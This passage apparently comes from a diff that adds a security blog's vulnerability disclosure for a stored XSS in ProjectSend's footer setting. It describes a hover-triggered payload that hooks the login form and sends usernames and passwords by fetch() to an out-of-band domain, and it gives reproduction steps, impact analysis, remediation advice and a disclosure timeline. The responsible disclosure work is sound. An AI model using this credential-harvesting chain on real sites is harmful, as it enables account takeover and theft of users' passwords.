+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>An out-of-band domain (<code>oastify.com</code>, Burp Collaborator) was used for exfiltration to provide unambiguous, blind confirmation of successful credential capture independent of application logging.</p>
+<h3 id="attack-vector-breakdown">Attack Vector Breakdown<a class="headerlink" href="#attack-vector-breakdown" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Injection Delivery:</strong> An attacker holding the <code>Edit Settings</code> permission stores the crafted <code>&lt;span&gt;</code> payload in the Footer Content field via the admin settings UI.</li>
+<li><strong>Sanitization Bypass:</strong> <code>strip_tags()</code> allows <code>&lt;span&gt;</code> through its tag allowlist but performs no attribute filtering, so the <code>onmouseover</code> event handler survives untouched.</li>
+<li><strong>Global Persistence:</strong> <code>render_footer_text()</code> echoes the stored content into every page footer application-wide, including the unauthenticated login page.</li>
+<li><strong>Victim Interaction:</strong> A victim (authenticated or not) hovers over the injected footer text, executing the handler and attaching a <code>submit</code> listener to the login form.</li>
+<li><strong>Credential Exfiltration:</strong> When the victim submits the login form, the listener reads the <code>username</code> and <code>password</code> field values and sends them via <code>fetch()</code> to an attacker-controlled domain before the credentials are validated by the application.</li>
+</ol>
+<h2 id="steps-to-reproduce">Steps to Reproduce<a class="headerlink" href="#steps-to-reproduce" title="Permanent link">&para;</a></h2>
+<ol>
+<li>Authenticate to ProjectSend as a user holding the <code>Edit Settings</code> permission (default: a user with role System Administrator).</li>
+<li>Navigate to <strong>Options → General Options → Site Information</strong>.</li>
+<li>Paste the payload above into the Footer Content field and save. (You will need to modify the payload to point at your own domain or IP address to listen for OOB requests.)</li>
+<li>Log out, or open a private/incognito browser session.</li>
+<li>Navigate to the ProjectSend <strong>login page</strong> as an unauthenticated visitor.</li>
+<li>Hover the mouse cursor over the injected footer text ("Hover to inject payload to submit button - Credential harvest"). This attaches the credential-exfiltration listener to the login form's submit button.</li>
+<li>Enter any username/password and click the submit/login button.</li>
+<li>Observe the interaction received on the attacker-controlled OOB listener, containing the <code>u</code> (username) and <code>p</code> (password) values submitted by the victim, captured before the login request completes.</li>
+</ol>
+<p><em>(Evidence: screenshots of the saved payload in the admin settings UI, the rendered footer on the login page, and the OOB listener interaction log showing captured <code>u=</code>/<code>p=</code> values.)</em></p>
+<p><img alt="Saved payload and OOB listener capturing exfiltrated credentials" src="../../assets/c1bfa3128663425293948ed0d131b610.png" /></p>
+<h2 id="impact">Impact<a class="headerlink" href="#impact" title="Permanent link">&para;</a></h2>
+<p>Because the Footer Content field renders on <strong>every page</strong>, this is first and foremost a <strong>site-wide stored XSS</strong>, with the login-page credential-harvesting chain serving as a high-impact demonstration of exploitability against both authenticated and unauthenticated users. Session-cookie theft is not viable due to <code>HttpOnly</code>, but credential capture is unaffected by that control and yields full account takeover directly.</p>
+<p><strong>Pathway 1: Default configuration (System Administrator attacker)</strong></p>
+<p>Even though the injecting party already holds full administrative rights, this is not a self-limiting bug:</p>
+<ul>
+<li>The payload persists independently of the attacker's own account and privileges. An administrator who is later demoted, offboarded, or has their access revoked can retain a durable credential-harvesting backdoor that continues operating after their legitimate access is gone.</li>
+<li>The attacker can harvest credentials of <em>other</em> administrators or users to act under a different identity, avoiding their own audit trail (attribution laundering).</li>
+<li>Any user segmentation (e.g., per-admin client/project visibility, if present) can be bypassed by simply logging in as a harvested identity rather than using the attacker's own scoped account.</li>
+</ul>
+<p><strong>Pathway 2: Non-default configuration (custom role with <code>Edit Settings</code>)</strong></p>
+<p>If a deployment has granted <code>Edit Settings</code> to a custom role short of full System Administrator, this becomes a direct <strong>privilege escalation</strong> primitive: a moderately privileged user can harvest a genuine System Administrator's credentials the next time they log in, escalating to full administrative control of the application. This pathway requires a non-default RBAC configuration and is documented separately here rather than folded into the primary CVSS score.</p>
+<h2 id="remediation-recommendations">Remediation Recommendations<a class="headerlink" href="#remediation-recommendations" title="Permanent link">&para;</a></h2>
+<p>To eliminate this vulnerability and protect deployment environments against site-wide stored XSS and credential harvesting, developers and platform administrators should apply the following remediation steps.</p>
+<ol>
+<li><strong>Stop relying on <code>strip_tags()</code> for XSS prevention.</strong> <code>strip_tags()</code> is a tag-name filter, not an HTML sanitizer. It was never designed to strip attributes, and per the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-for-html-contexts">OWASP XSS Prevention Cheat Sheet</a>, attribute-blind tag stripping is a known-insufficient pattern precisely because event-handler attributes (<code>onmouseover</code>, <code>onclick</code>, <code>onerror</code>, etc.) survive on any tag left in the allowlist. <code>render_footer_text()</code> must not use <code>strip_tags()</code> as its only control.</li>
+<li><strong>If the footer only needs to display plain text</strong>, drop HTML support entirely and output-encode with <code>htmlspecialchars($content, ENT_QUOTES, 'UTF-8')</code> instead of <code>strip_tags()</code>. This is the simplest and most robust fix if rich formatting (bold/italic/links) isn't a hard requirement.</li>
+<li><strong>If limited rich-text formatting must be preserved</strong> (the current <code>&lt;br&gt;&lt;span&gt;&lt;a&gt;&lt;strong&gt;&lt;em&gt;&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;s&gt;</code> allowlist suggests it is), replace <code>strip_tags()</code> with a real HTML sanitization library such as <a href="http://htmlpurifier.org/">HTML Purifier</a> (PHP) configured with an explicit tag <em>and</em> attribute allowlist that excludes all <code>on*</code> event handlers and <code>javascript:</code>/<code>data:</code> URI schemes in <code>href</code>/<code>src</code>. Do not attempt to hand-roll attribute stripping with regex — this is the same class of mistake as the current <code>strip_tags()</code> usage.</li>
+<li>Apply the same fix to any other setting rendered through <code>strip_tags()</code> with a tag allowlist elsewhere in the codebase. This pattern should be audited application-wide, not just in <code>render_footer_text()</code>.</li>
+<li>Deploy a restrictive <strong>Content-Security-Policy</strong> (disallowing inline event handlers via a nonce/hash-based policy, and restricting <code>connect-src</code>/<code>form-action</code>) as defense-in-depth so that even a future regression in output filtering cannot be trivially weaponized for data exfiltration the way this PoC demonstrates.</li>
+<li>Apply the principle of least privilege to the <code>Edit Settings</code> permission when assigning custom roles, and consider flagging in documentation that this permission is equivalent to full administrative trust given its ability to affect all users application-wide.</li>
+</ol>
+<h2 id="disclosure-timeline">Disclosure Timeline<a class="headerlink" href="#disclosure-timeline" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>10 July 2026, 01:45 AEST</strong> — Reported to ProjectSend maintainers via <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#99;&#111;&#110;&#116;&#97;&#99;&#116;&#64;&#112;&#114;&#111;&#106;&#101;&#99;&#116;&#115;&#101;&#110;&#100;&#46;&#111;&#114;&#103;">&#99;&#111;&#110;&#116;&#97;&#99;&#116;&#64;&#112;&#114;&#111;&#106;&#101;&#99;&#116;&#115;&#101;&#110;&#100;&#46;&#111;&#114;&#103;</a>.</li>
+<li><strong>Patched in r2098</strong> — Maintainers shipped a fix on the legacy branch, tightening output handling on the Footer Content setting.</li>
+</ul>
+<hr />
+<h1 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h1>
+<ul>
+<li>Fix commit (legacy branch): <a href="https://github.com/projectsend/legacy/commit/612fe2fbc02a8906b2a0b6191c9123678b8ecaaa">projectsend/legacy@612fe2f</a></li>
+</ul>
+<div class="admonition warning">
+<p class="admonition-title">AI generated content</p>
+<p>Some of the content on this blog is generated by AI and may contain mistakes. If you notice an issue or technical oversight, please reach out via email at <a href="mailto:hello@x6b.me">hello@x6b.me</a>.</p>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">CWE-79</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">CWE-83</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">Stored XSS</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">ProjectSend</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">Credential Harvesting</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">Formjacking</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 x6b
+
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":[],"search":"../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.6e5f0216.min.js"></script>
+      
+    
+  </body>
+</html>
